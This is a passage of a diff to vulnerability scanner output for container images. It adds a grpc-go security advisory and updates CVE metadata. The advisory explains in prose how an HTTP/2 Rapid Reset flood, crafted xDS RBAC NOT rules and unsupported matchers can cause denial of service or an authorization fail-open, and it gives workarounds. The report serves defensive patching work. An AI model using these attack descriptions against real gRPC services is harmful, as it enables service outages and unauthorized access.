+│                        │     │                   `RequestedServerName` matchers
+│                        │     │                   - Affected Component: xDS RBAC 
+│                        │     │                   - Impact: When building policy matchers for gRPC RBAC from
+│                        │     │                   xDS configurations, unsupported `permission` and `principal`
+│                        │     │                    rules (specifically `Metadata` and `RequestedServerName`)
+│                        │     │                   were silently ignored and treated as no-ops.
+│                        │     │                     - If an authorization policy relied purely on these
+│                        │     │                   matchers for access control, treating those rules as no-ops
+│                        │     │                   effectively removed the restrictions.
+│                        │     │                   - If these unsupported rules were nested inside logical
+│                        │     │                   `NOT` rules (`Permission_NotRule` / `Principal_NotId`) or
+│                        │     │                   multi-condition `OR/AND` rules, silently dropping them
+│                        │     │                   changed the boolean logic flow of the authorization engine.
+│                        │     │                   As a result, policy evaluation decisions could fail open,
+│                        │     │                   allowing unauthorized clients to access protected gRPC
+│                        │     │                   services or resources.
+│                        │     │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of
+│                        │     │                   Service via Stream Aborts
+│                        │     │                   - Affected Component: HTTP/2 transport
+│                        │     │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid
+│                        │     │                   Reset only applied threshold checks to items that directly
+│                        │     │                   resulted in control frames being written back to the wire,
+│                        │     │                   such as `SETTINGS` ACKs or server-initiated `RST_STREAM`s.
+│                        │     │                   When a client initiated a rapid flood of stream creation
+│                        │     │                   (`HEADERS`) immediately followed by stream termination
+│                        │     │                   `RST_STREAM`, items queued up in the control buffer without
+│                        │     │                   counting against the transport response frame threshold. An
+│                        │     │                   attacker can repeatedly trigger this flood sequence to
+│                        │     │                   bypass reader blocking, resulting in high CPU usage, and
+│                        │     │                   Denial of Service (DoS).
+│                        │     │                   #### Denial of Service (Panic) in xDS RBAC Engine via
+│                        │     │                   Unsupported Fields inside NOT Rules
+│                        │     │                   - Impact: The xDS RBAC policy translators recursively
+│                        │     │                   generate matchers for nested rules. When a `NOT` rule
+│                        │     │                   wrapped an unsupported or unhandled field (such as
+│                        │     │                   `SourcedMetadata`), the recursive step returned an empty
+│                        │     │                   matcher. This could result in a runtime panic when the RBAC
+│                        │     │                   engine attempts to authorize an incoming request.
+│                        │     │                   An attacker or misconfigured/malicious xDS management server
+│                        │     │                    delivering an LDS/RDS update containing a `NOT` rule around
+│                        │     │                    an unhandled field causes the gRPC server process to crash
+│                        │     │                   immediately (CWE-248 / Denial of Service).
+│                        │     │                   ### Patches
+│                        │     │                   _Has the problem been patched? What versions should users
+│                        │     │                   upgrade to?_
+│                        │     │                   All three issues have been fixed in `master` and will be
+│                        │     │                   released in 1.82.1 shortly.
+│                        │     │                   ### Workarounds
+│                        │     │                   _Is there a way for users to fix or remediate the
+│                        │     │                   vulnerability without upgrading?_
+│                        │     │                   If upgrading grpc-go immediately is not possible, apply the
+│                        │     │                   following workarounds based on your deployment
+│                        │     │                   architecture:
+│                        │     │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that
+│                        │     │                   upstream xDS management servers do not push RBAC policies
+│                        │     │                   containing `Metadata`, `RequestedServerName`, or `NOT` rules
+│                        │     │                    wrapping unsupported fields (such as `SourcedMetadata`) to
+│                        │     │                   grpc-go servers.
+│                        │     │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse
+│                        │     │                   proxies or load balancers (such as Envoy) with strict HTTP/2
+│                        │     │                    `max_concurrent_streams` limits and active rate limiting on
+│                        │     │                    `RST_STREAM` frequency per connection.
+│                        │     │                   ### Severity
+│                        │     │                     | Vulnerability | Qualitative Severity | Approximate CVSS
+│                        │     │                   v3.1 Score | Primary Impact |
+│                        │     │                     | :--- | :--- | :--- | :--- |
+│                        │     │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` |
+│                        │     │                   Unauthorized Access / Fail-Open |
+│                        │     │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` |
+│                        │     │                   High CPU Consumption / Denial of Service |
+│                        │     │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` |
+│                        │     │                   Process Crash / Denial of Service | 
+│                        │     ├ Severity        : HIGH 
+│                        │     ├ VendorSeverity   ─ ghsa: 3 
+│                        │     ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
+│                        │     │                         │            :H/VA:H/SC:N/SI:N/SA:N 
+│                        │     │                         ╰ V40Score : 8.8 
+│                        │     ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
+│                        │     │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab98013
+│                        │     │                  │      f72a142fe0fc89c19770b2935 
+│                        │     │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
+│                        │     │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
+│                        │     │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/GH
+│                        │     │                         SA-hrxh-6v49-42gf 
+│                        │     ├ PublishedDate   : 2026-07-21T22:03:55Z 
+│                        │     ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
+│                        ├ [8] ╭ VulnerabilityID : CVE-2026-39822 
 │                        │     ├ VendorIDs        ─ [0]: GO-2026-4970 
 │                        │     ├ PkgID           : stdlib@v1.26.4 
 │                        │     ├ PkgName         : stdlib 
@@ -8609,6 +9955,7 @@
 │                        │     ├ Severity        : HIGH 
 │                        │     ├ CweIDs           ─ [0]: CWE-61 
 │                        │     ├ VendorSeverity   ╭ alma       : 3 
+│                        │     │                  ├ amazon     : 2 
 │                        │     │                  ├ bitnami    : 3 
 │                        │     │                  ├ oracle-oval: 3 
 │                        │     │                  ├ redhat     : 3 
@@ -8638,7 +9985,7 @@
 │                        │     │                  ╰ [14]: https://www.cve.org/CVERecord?id=CVE-2026-39822 
 │                        │     ├ PublishedDate   : 2026-07-08T17:17:21.31Z 
 │                        │     ╰ LastModifiedDate: 2026-07-13T14:54:26.317Z 
-│                        ╰ [8] ╭ VulnerabilityID : CVE-2026-42505 
+│                        ╰ [9] ╭ VulnerabilityID : CVE-2026-42505 
 │                              ├ VendorIDs        ─ [0]: GO-2026-5856 
 │                              ├ PkgID           : stdlib@v1.26.4 
 │                              ├ PkgName         : stdlib 
@@ -8665,7 +10012,8 @@
 │                              │                   client hello. 
 │                              ├ Severity        : MEDIUM 
 │                              ├ CweIDs           ─ [0]: CWE-201 
-│                              ├ VendorSeverity   ╭ bitnami: 2 
+│                              ├ VendorSeverity   ╭ amazon : 2 
+│                              │                  ├ bitnami: 2 
 │                              │                  ╰ redhat : 2 
 │                              ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:
 │                              │                  │         │           N/A:N 
@@ -8741,35 +10089,163 @@
 │                        │     ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size
 │                        │     │                   of a parameter value overflows the message buffer. 
 │                        │     ├ Severity        : UNKNOWN 
-│                        │     ╰ References       ╭ [0]: https://go.dev/cl/786345 
-│                        │                        ├ [1]: https://go.dev/issue/79795 
-│                        │                        ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
-│                        ╰ [2] ╭ VulnerabilityID : CVE-2026-56852 
-│                              ├ VendorIDs        ─ [0]: GO-2026-5970 
-│                              ├ PkgID           : golang.org/x/text@v0.38.0 
-│                              ├ PkgName         : golang.org/x/text 
-│                              ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/text@v0.38.0 
-│                              │                  ╰ UID : 23d84dcd6ab5ac00 
-│                              ├ InstalledVersion: v0.38.0 
-│                              ├ FixedVersion    : 0.39.0 
+│                        │     ├ References       ╭ [0]: https://go.dev/cl/786345 
+│                        │     │                  ├ [1]: https://go.dev/issue/79795 
+│                        │     │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
+│                        │     ├ PublishedDate   : 2026-07-21T20:17:01.213Z 
+│                        │     ╰ LastModifiedDate: 2026-07-21T20:17:01.213Z 
+│                        ├ [2] ╭ VulnerabilityID : CVE-2026-56852 
+│                        │     ├ VendorIDs        ─ [0]: GO-2026-5970 
+│                        │     ├ PkgID           : golang.org/x/text@v0.38.0 
+│                        │     ├ PkgName         : golang.org/x/text 
+│                        │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/text@v0.38.0 
+│                        │     │                  ╰ UID : 23d84dcd6ab5ac00 
+│                        │     ├ InstalledVersion: v0.38.0 
+│                        │     ├ FixedVersion    : 0.39.0 
+│                        │     ├ Status          : fixed 
+│                        │     ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a1
+│                        │     │                  │         97d9e39c5494d4581e40 
+│                        │     │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561d
+│                        │     │                            f117adb7086d939b6bf5 
+│                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
+│                        │     ├ DataSource       ╭ ID  : govulndb 
+│                        │     │                  ├ Name: The Go Vulnerability Database 
+│                        │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
+│                        │     ├ Fingerprint     : sha256:a636e659f517b52340af85d281e168c5d234bdcef997fdbda7294
+│                        │     │                   86516572019 
+│                        │     ├ Title           : Infinite loop on invalid input in golang.org/x/text 
+│                        │     ├ Description     : A norm.Iter can enter an infinite loop when handling input
+│                        │     │                   containing invalid UTF-8 bytes. 
+│                        │     ├ Severity        : UNKNOWN 
+│                        │     ├ References       ╭ [0]: https://go.dev/cl/794100 
+│                        │     │                  ├ [1]: https://go.dev/issue/80142 
+│                        │     │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5970 
+│                        │     ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
+│                        │     ╰ LastModifiedDate: 2026-07-21T20:17:02.867Z 
+│                        ╰ [3] ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
+│                              ├ PkgID           : google.golang.org/grpc@v1.79.3 
+│                              ├ PkgName         : google.golang.org/grpc 
+│                              ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.79.3 
+│                              │                  ╰ UID : 2977bc5805b7c756 
+│                              ├ InstalledVersion: v1.79.3 
+│                              ├ FixedVersion    : 1.82.1 
 │                              ├ Status          : fixed 
 │                              ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a1
 │                              │                  │         97d9e39c5494d4581e40 
 │                              │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561d
 │                              │                            f117adb7086d939b6bf5 
-│                              ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
-│                              ├ DataSource       ╭ ID  : govulndb 
-│                              │                  ├ Name: The Go Vulnerability Database 
-│                              │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│                              ├ Fingerprint     : sha256:a636e659f517b52340af85d281e168c5d234bdcef997fdbda7294
-│                              │                   86516572019 
-│                              ├ Title           : Infinite loop on invalid input in golang.org/x/text 
-│                              ├ Description     : A norm.Iter can enter an infinite loop when handling input
-│                              │                   containing invalid UTF-8 bytes. 
-│                              ├ Severity        : UNKNOWN 
-│                              ╰ References       ╭ [0]: https://go.dev/cl/794100 
-│                                                 ├ [1]: https://go.dev/issue/80142 
-│                                                 ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5970 
+│                              ├ SeveritySource  : ghsa 
+│                              ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
+│                              ├ DataSource       ╭ ID  : ghsa 
+│                              │                  ├ Name: GitHub Security Advisory Go 
+│                              │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+│                              │                          cosystem%3Ago 
+│                              ├ Fingerprint     : sha256:8308175bdf9a148d785f07b20e9eca12b69bdb0c8a9aaf272c4aa
+│                              │                   11cc751dcd0 
+│                              ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
+│                              ├ Description     : Multiple security vulnerabilities have been identified and
+│                              │                   addressed in grpc-go affecting the xDS RBAC authorization
+│                              │                   engine (internal/xds/rbac) and the HTTP/2 transport server
+│                              │                   implementation (internal/transport). These vulnerabilities
+│                              │                   could result in:
+│                              │                   
+│                              │                   - Authorization Bypass (Fail-Open) when translating xDS RBAC
+│                              │                    policies containing `Metadata` or `RequestedServerName`
+│                              │                   fields.
+│                              │                   - Denial of Service (High CPU Consumption) due to an HTTP/2
+│                              │                   Rapid Reset mitigation bypass during client-initiated stream
+│                              │                    resets.
+│                              │                   - Denial of Service (Server Panic) when parsing crafted xDS
+│                              │                   RBAC policies containing `NOT` rules around unsupported
+│                              │                   ### Impact
+│                              │                   _What kind of vulnerability is it? Who is impacted?_
+│                              │                   #### xDS RBAC Authorization Bypass via `Metadata` &
+│                              │                   `RequestedServerName` matchers
+│                              │                   - Affected Component: xDS RBAC 
+│                              │                   - Impact: When building policy matchers for gRPC RBAC from
+│                              │                   xDS configurations, unsupported `permission` and `principal`
+│                              │                    rules (specifically `Metadata` and `RequestedServerName`)
+│                              │                   were silently ignored and treated as no-ops.
+│                              │                     - If an authorization policy relied purely on these
+│                              │                   matchers for access control, treating those rules as no-ops
+│                              │                   effectively removed the restrictions.
+│                              │                   - If these unsupported rules were nested inside logical
+│                              │                   `NOT` rules (`Permission_NotRule` / `Principal_NotId`) or
+│                              │                   multi-condition `OR/AND` rules, silently dropping them
+│                              │                   changed the boolean logic flow of the authorization engine.
+│                              │                   As a result, policy evaluation decisions could fail open,
+│                              │                   allowing unauthorized clients to access protected gRPC
+│                              │                   services or resources.
+│                              │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of
+│                              │                   Service via Stream Aborts
+│                              │                   - Affected Component: HTTP/2 transport
+│                              │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid
+│                              │                   Reset only applied threshold checks to items that directly
+│                              │                   resulted in control frames being written back to the wire,
+│                              │                   such as `SETTINGS` ACKs or server-initiated `RST_STREAM`s.
+│                              │                   When a client initiated a rapid flood of stream creation
+│                              │                   (`HEADERS`) immediately followed by stream termination
+│                              │                   `RST_STREAM`, items queued up in the control buffer without
+│                              │                   counting against the transport response frame threshold. An
+│                              │                   attacker can repeatedly trigger this flood sequence to
+│                              │                   bypass reader blocking, resulting in high CPU usage, and
+│                              │                   Denial of Service (DoS).
+│                              │                   #### Denial of Service (Panic) in xDS RBAC Engine via
+│                              │                   Unsupported Fields inside NOT Rules
+│                              │                   - Impact: The xDS RBAC policy translators recursively
+│                              │                   generate matchers for nested rules. When a `NOT` rule
+│                              │                   wrapped an unsupported or unhandled field (such as
+│                              │                   `SourcedMetadata`), the recursive step returned an empty
+│                              │                   matcher. This could result in a runtime panic when the RBAC
+│                              │                   engine attempts to authorize an incoming request.
+│                              │                   An attacker or misconfigured/malicious xDS management server
+│                              │                    delivering an LDS/RDS update containing a `NOT` rule around
+│                              │                    an unhandled field causes the gRPC server process to crash
+│                              │                   immediately (CWE-248 / Denial of Service).
+│                              │                   ### Patches
+│                              │                   _Has the problem been patched? What versions should users
+│                              │                   upgrade to?_
+│                              │                   All three issues have been fixed in `master` and will be
+│                              │                   released in 1.82.1 shortly.
+│                              │                   ### Workarounds
+│                              │                   _Is there a way for users to fix or remediate the
+│                              │                   vulnerability without upgrading?_
+│                              │                   If upgrading grpc-go immediately is not possible, apply the
+│                              │                   following workarounds based on your deployment
+│                              │                   architecture:
+│                              │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that
+│                              │                   upstream xDS management servers do not push RBAC policies
+│                              │                   containing `Metadata`, `RequestedServerName`, or `NOT` rules
+│                              │                    wrapping unsupported fields (such as `SourcedMetadata`) to
+│                              │                   grpc-go servers.
+│                              │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse
+│                              │                   proxies or load balancers (such as Envoy) with strict HTTP/2
+│                              │                    `max_concurrent_streams` limits and active rate limiting on
+│                              │                    `RST_STREAM` frequency per connection.
+│                              │                   ### Severity
+│                              │                     | Vulnerability | Qualitative Severity | Approximate CVSS
+│                              │                   v3.1 Score | Primary Impact |
+│                              │                     | :--- | :--- | :--- | :--- |
+│                              │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` |
+│                              │                   Unauthorized Access / Fail-Open |
+│                              │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` |
+│                              │                   High CPU Consumption / Denial of Service |
+│                              │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` |
+│                              │                   Process Crash / Denial of Service | 
+│                              ├ Severity        : HIGH 
+│                              ├ VendorSeverity   ─ ghsa: 3 
+│                              ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
+│                              │                         │            :H/VA:H/SC:N/SI:N/SA:N 
+│                              │                         ╰ V40Score : 8.8 
+│                              ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
+│                              │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab98013
+│                              │                  │      f72a142fe0fc89c19770b2935 
+│                              │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
+│                              │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
+│                              │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/GH
+│                              │                         SA-hrxh-6v49-42gf 
+│                              ├ PublishedDate   : 2026-07-21T22:03:55Z 
+│                              ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
 ├ [13] ╭ Target         : usr/local/bin/k3d 
 │      ├ Class          : lang-pkgs 
 │      ├ Type           : gobinary 
@@ -8978,7 +10454,7 @@
 │                        │      │                  │      026/cve-2026-41567.json 
 │                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-41567 
 │                        │      ├ PublishedDate   : 2026-06-05T02:17:13.817Z 
-│                        │      ╰ LastModifiedDate: 2026-07-17T13:18:39.403Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T12:18:28.263Z 
 │                        ├ [3]  ╭ VulnerabilityID : CVE-2026-42306 
 │                        │      ├ VendorIDs        ─ [0]: GHSA-rg2x-37c3-w2rh 
 │                        │      ├ PkgID           : github.com/docker/docker@v28.5.2+incompatible 
@@ -9099,7 +10575,7 @@
 │                        │      │                  │       2026/cve-2026-33997.json 
 │                        │      │                  ╰ [12]: https://www.cve.org/CVERecord?id=CVE-2026-33997 
 │                        │      ├ PublishedDate   : 2026-03-31T03:15:57.523Z 
-│                        │      ╰ LastModifiedDate: 2026-07-15T02:20:27.623Z 
+│                        │      ╰ LastModifiedDate: 2026-07-20T12:18:47.963Z 
 │                        ├ [5]  ╭ VulnerabilityID : CVE-2026-41568 
 │                        │      ├ VendorIDs        ─ [0]: GHSA-vp62-88p7-qqf5 
 │                        │      ├ PkgID           : github.com/docker/docker@v28.5.2+incompatible 
@@ -9175,9 +10651,11 @@
 │                        │      ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size
 │                        │      │                    of a parameter value overflows the message buffer. 
 │                        │      ├ Severity        : UNKNOWN 
-│                        │      ╰ References       ╭ [0]: https://go.dev/cl/786345 
-│                        │                         ├ [1]: https://go.dev/issue/79795 
-│                        │                         ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
+│                        │      ├ References       ╭ [0]: https://go.dev/cl/786345 
+│                        │      │                  ├ [1]: https://go.dev/issue/79795 
+│                        │      │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
+│                        │      ├ PublishedDate   : 2026-07-21T20:17:01.213Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T20:17:01.213Z 
 │                        ├ [7]  ╭ VulnerabilityID : CVE-2026-56852 
 │                        │      ├ VendorIDs        ─ [0]: GO-2026-5970 
 │                        │      ├ PkgID           : golang.org/x/text@v0.37.0 
@@ -9201,10 +10679,139 @@
 │                        │      ├ Description     : A norm.Iter can enter an infinite loop when handling input
 │                        │      │                   containing invalid UTF-8 bytes. 
 │                        │      ├ Severity        : UNKNOWN 
-│                        │      ╰ References       ╭ [0]: https://go.dev/cl/794100 
-│                        │                         ├ [1]: https://go.dev/issue/80142 
-│                        │                         ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5970 
-│                        ├ [8]  ╭ VulnerabilityID : CVE-2026-27145 
+│                        │      ├ References       ╭ [0]: https://go.dev/cl/794100 
+│                        │      │                  ├ [1]: https://go.dev/issue/80142 
+│                        │      │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5970 
+│                        │      ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T20:17:02.867Z 
+│                        ├ [8]  ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
+│                        │      ├ PkgID           : google.golang.org/grpc@v1.81.1 
+│                        │      ├ PkgName         : google.golang.org/grpc 
+│                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.81.1 
+│                        │      │                  ╰ UID : 53f12763215d3977 
+│                        │      ├ InstalledVersion: v1.81.1 
+│                        │      ├ FixedVersion    : 1.82.1 
+│                        │      ├ Status          : fixed 
+│                        │      ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a
+│                        │      │                  │         197d9e39c5494d4581e40 
+│                        │      │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561
+│                        │      │                            df117adb7086d939b6bf5 
+│                        │      ├ SeveritySource  : ghsa 
+│                        │      ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
+│                        │      ├ DataSource       ╭ ID  : ghsa 
+│                        │      │                  ├ Name: GitHub Security Advisory Go 
+│                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+
+│                        │      │                          ecosystem%3Ago 
+│                        │      ├ Fingerprint     : sha256:206f5d895da424b94acaeee3076a286c0c902026143e79120746
+│                        │      │                   cf6acee4ebf1 
+│                        │      ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
+│                        │      ├ Description     : Multiple security vulnerabilities have been identified and
+│                        │      │                   addressed in grpc-go affecting the xDS RBAC authorization
+│                        │      │                   engine (internal/xds/rbac) and the HTTP/2 transport server
+│                        │      │                   implementation (internal/transport). These vulnerabilities
+│                        │      │                   could result in:
+│                        │      │                   
+│                        │      │                   - Authorization Bypass (Fail-Open) when translating xDS
+│                        │      │                   RBAC policies containing `Metadata` or
+│                        │      │                   `RequestedServerName` fields.
+│                        │      │                   - Denial of Service (High CPU Consumption) due to an HTTP/2
+│                        │      │                    Rapid Reset mitigation bypass during client-initiated
+│                        │      │                   stream resets.
+│                        │      │                   - Denial of Service (Server Panic) when parsing crafted xDS
+│                        │      │                    RBAC policies containing `NOT` rules around unsupported
+│                        │      │                   fields.
+│                        │      │                   ### Impact
+│                        │      │                   _What kind of vulnerability is it? Who is impacted?_
+│                        │      │                   #### xDS RBAC Authorization Bypass via `Metadata` &
+│                        │      │                   `RequestedServerName` matchers
+│                        │      │                   - Affected Component: xDS RBAC 
+│                        │      │                   - Impact: When building policy matchers for gRPC RBAC from
+│                        │      │                   xDS configurations, unsupported `permission` and
+│                        │      │                   `principal` rules (specifically `Metadata` and
+│                        │      │                   `RequestedServerName`) were silently ignored and treated as
+│                        │      │                    no-ops.
+│                        │      │                     - If an authorization policy relied purely on these
+│                        │      │                   matchers for access control, treating those rules as no-ops
+│                        │      │                    effectively removed the restrictions.
+│                        │      │                   - If these unsupported rules were nested inside logical
+│                        │      │                   `NOT` rules (`Permission_NotRule` / `Principal_NotId`) or
+│                        │      │                   multi-condition `OR/AND` rules, silently dropping them
+│                        │      │                   changed the boolean logic flow of the authorization
+│                        │      │                   engine.
+│                        │      │                   As a result, policy evaluation decisions could fail open,
+│                        │      │                   allowing unauthorized clients to access protected gRPC
+│                        │      │                   services or resources.
+│                        │      │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of
+│                        │      │                   Service via Stream Aborts
+│                        │      │                   - Affected Component: HTTP/2 transport
+│                        │      │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid
+│                        │      │                   Reset only applied threshold checks to items that directly
+│                        │      │                   resulted in control frames being written back to the wire,
+│                        │      │                   such as `SETTINGS` ACKs or server-initiated `RST_STREAM`s.
+│                        │      │                   When a client initiated a rapid flood of stream creation
+│                        │      │                   (`HEADERS`) immediately followed by stream termination
+│                        │      │                   `RST_STREAM`, items queued up in the control buffer without
+│                        │      │                    counting against the transport response frame threshold.
+│                        │      │                   An attacker can repeatedly trigger this flood sequence to
+│                        │      │                   bypass reader blocking, resulting in high CPU usage, and
+│                        │      │                   Denial of Service (DoS).
+│                        │      │                   #### Denial of Service (Panic) in xDS RBAC Engine via
+│                        │      │                   Unsupported Fields inside NOT Rules
+│                        │      │                   - Impact: The xDS RBAC policy translators recursively
+│                        │      │                   generate matchers for nested rules. When a `NOT` rule
+│                        │      │                   wrapped an unsupported or unhandled field (such as
+│                        │      │                   `SourcedMetadata`), the recursive step returned an empty
+│                        │      │                   matcher. This could result in a runtime panic when the RBAC
+│                        │      │                    engine attempts to authorize an incoming request.
+│                        │      │                   An attacker or misconfigured/malicious xDS management
+│                        │      │                   server delivering an LDS/RDS update containing a `NOT` rule
+│                        │      │                    around an unhandled field causes the gRPC server process
+│                        │      │                   to crash immediately (CWE-248 / Denial of Service).
+│                        │      │                   ### Patches
+│                        │      │                   _Has the problem been patched? What versions should users
+│                        │      │                   upgrade to?_
+│                        │      │                   All three issues have been fixed in `master` and will be
+│                        │      │                   released in 1.82.1 shortly.
+│                        │      │                   ### Workarounds
+│                        │      │                   _Is there a way for users to fix or remediate the
+│                        │      │                   vulnerability without upgrading?_
+│                        │      │                   If upgrading grpc-go immediately is not possible, apply the
+│                        │      │                    following workarounds based on your deployment
+│                        │      │                   architecture:
+│                        │      │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that
+│                        │      │                   upstream xDS management servers do not push RBAC policies
+│                        │      │                   containing `Metadata`, `RequestedServerName`, or `NOT`
+│                        │      │                   rules wrapping unsupported fields (such as
+│                        │      │                   `SourcedMetadata`) to grpc-go servers.
+│                        │      │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse
+│                        │      │                   proxies or load balancers (such as Envoy) with strict
+│                        │      │                   HTTP/2 `max_concurrent_streams` limits and active rate
+│                        │      │                   limiting on `RST_STREAM` frequency per connection.
+│                        │      │                   ### Severity
+│                        │      │                     | Vulnerability | Qualitative Severity | Approximate CVSS
+│                        │      │                    v3.1 Score | Primary Impact |
+│                        │      │                     | :--- | :--- | :--- | :--- |
+│                        │      │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` |
+│                        │      │                   Unauthorized Access / Fail-Open |
+│                        │      │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` |
+│                        │      │                   High CPU Consumption / Denial of Service |
+│                        │      │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` |
+│                        │      │                    Process Crash / Denial of Service | 
+│                        │      ├ Severity        : HIGH 
+│                        │      ├ VendorSeverity   ─ ghsa: 3 
+│                        │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/V
+│                        │      │                         │            I:H/VA:H/SC:N/SI:N/SA:N 
+│                        │      │                         ╰ V40Score : 8.8 
+│                        │      ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
+│                        │      │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab9801
+│                        │      │                  │      3f72a142fe0fc89c19770b2935 
+│                        │      │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
+│                        │      │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
+│                        │      │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/G
+│                        │      │                         HSA-hrxh-6v49-42gf 
+│                        │      ├ PublishedDate   : 2026-07-21T22:03:55Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
+│                        ├ [9]  ╭ VulnerabilityID : CVE-2026-27145 
 │                        │      ├ VendorIDs        ─ [0]: GO-2026-5037 
 │                        │      ├ PkgID           : stdlib@v1.26.3 
 │                        │      ├ PkgName         : stdlib 
@@ -9264,31 +10871,45 @@
 │                        │      │                  ├ [13]: https://access.redhat.com/errata/RHSA-2026:39879 
 │                        │      │                  ├ [14]: https://access.redhat.com/errata/RHSA-2026:41030 
 │                        │      │                  ├ [15]: https://access.redhat.com/errata/RHSA-2026:41036 
-│                        │      │                  ├ [16]: https://access.redhat.com/security/cve/CVE-2026-27145 
-│                        │      │                  ├ [17]: https://bugzilla.redhat.com/2445356 
-│                        │      │                  ├ [18]: https://bugzilla.redhat.com/2484207 
-│                        │      │                  ├ [19]: https://bugzilla.redhat.com/show_bug.cgi?id=2445356 
-│                        │      │                  ├ [20]: https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
-│                        │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2
+│                        │      │                  ├ [16]: https://access.redhat.com/errata/RHSA-2026:41930 
+│                        │      │                  ├ [17]: https://access.redhat.com/errata/RHSA-2026:42043 
+│                        │      │                  ├ [18]: https://access.redhat.com/errata/RHSA-2026:42047 
+│                        │      │                  ├ [19]: https://access.redhat.com/errata/RHSA-2026:42049 
+│                        │      │                  ├ [20]: https://access.redhat.com/errata/RHSA-2026:42050 
+│                        │      │                  ├ [21]: https://access.redhat.com/errata/RHSA-2026:42051 
+│                        │      │                  ├ [22]: https://access.redhat.com/errata/RHSA-2026:42079 
+│                        │      │                  ├ [23]: https://access.redhat.com/errata/RHSA-2026:42080 
